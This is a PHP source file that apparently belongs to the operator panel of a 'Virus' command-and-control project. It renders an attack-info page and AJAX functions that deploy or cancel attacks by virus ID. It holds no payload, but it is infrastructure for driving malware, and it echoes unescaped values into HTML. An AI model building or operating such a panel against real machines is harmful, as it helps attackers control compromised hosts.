<?php

namespace Kelvinho\Virus\Attack;

use Kelvinho\Virus\HtmlTemplate;
use Kelvinho\Virus\Timezone;
use Kelvinho\Virus\User;
use function Kelvinho\Virus\formattedTime;

/**
 * Class AdminTemplates
 * @package Kelvinho\Virus\Attack
 *
 * These are some admin templates, for making the admin page of attack packages easier and more convenient
 */
class AdminTemplates {
    /**
     * The header (<head> included. This contains:
     * - Css from 157239n.com
     * - Css from w3school.com
     * - Viewports
     * - .link classes have pointer cursor and their color blue
     *
     * @return string The html code to embed in
     */
    public static function header(): string {
        ob_start(); ?>
        <head>
            <title>Attack info</title>
            <?php echo HtmlTemplate::header(); ?>
        </head>
        <?php return ob_get_clean();
    }

    /**
     * The body (no <body> included). This contains:
     * - The attack name, has id "name"
     * - The package name
     * - The package description
     * - The attack hash
     * - The attack status
     * - The attack profile, has id "profile"
     *
     * @param AttackInterface $attack The attack object
     * @return string The html code to embed in
     */
    public static function body(AttackInterface $attack): string {
        ob_start(); ?>
        <h1><a href="<?php echo DOMAIN_VIRUS_INFO; ?>">Attack info</a></h1>
        <br>
        <div>Name</div>
        <input id="name" class="w3-input" type="text" value="<?php echo $attack->getName(); ?>">
        <br>
        <div>Package</div>
        <input class="w3-input" type="text" disabled value="<?php echo PackageRegistrar::getDisplayName($attack->getPackageDbName()); ?>">
        <br>
        <div>Package description</div>
        <textarea rows="3" cols="80" class="w3-input" disabled
                  style="resize: vertical;"><?php echo PackageRegistrar::getDescription($attack->getPackageDbName()); ?></textarea>
        <br>
        <div>Hash/id</div>
        <input class="w3-input" type="text" disabled value="<?php echo $attack->getAttackId(); ?>">
        <br>
        <div>Status</div>
        <input class="w3-input" type="text" disabled value="<?php echo $attack->getStatus();
        if ($attack->getStatus() === AttackInterface::STATUS_EXECUTED) {
            $user = User::get($_SESSION["user_handle"]);
            echo " at " . formattedTime($attack->getExecutedTime() + Timezone::getUnixOffset($user->getTimezone())) . " UTC " . $user->getTimezone();
        } ?>">
        <br>
        <div>Profile</div>
        <textarea id="profile" rows="6" cols="80" class="w3-input"
                  style="resize: vertical;"><?php echo $attack->getProfile(); ?></textarea>
        <br>
        <?php return ob_get_clean();
    }

    /**
     * The script tag (with <script> included), defines 2 functions:
     * - deployAttack(), deploy a certain attack
     * - cancelAttack(), cancels a certain attack
     *
     * @param AttackInterface $attack The attack object
     * @return string The html code to embed in
     */
    public static function script(AttackInterface $attack): string {
        ob_start(); ?>
        <script type="application/javascript">
            function deployAttack() {
                $.ajax({
                    url: "<?php echo DOMAIN_CONTROLLER; ?>/deployAttack.php",
                    type: "POST",
                    data: {
                        virus_id: "<?php echo $attack->getVirusId(); ?>",
                        attack_id: "<?php echo $attack->getAttackId(); ?>"
                    },
                    success: function () {
                        window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>";
                    }
                });
            }

            function cancelAttack() {
                $.ajax({
                    url: "<?php echo DOMAIN_CONTROLLER; ?>/cancelAttack.php",
                    type: "POST",
                    data: {
                        virus_id: "<?php echo $attack->getVirusId(); ?>",
                        attack_id: "<?php echo $attack->getAttackId(); ?>"
                    },
                    success: function () {
                        window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>"
                    }
                })
            }
        </script>
        <?php return ob_get_clean();
    }
}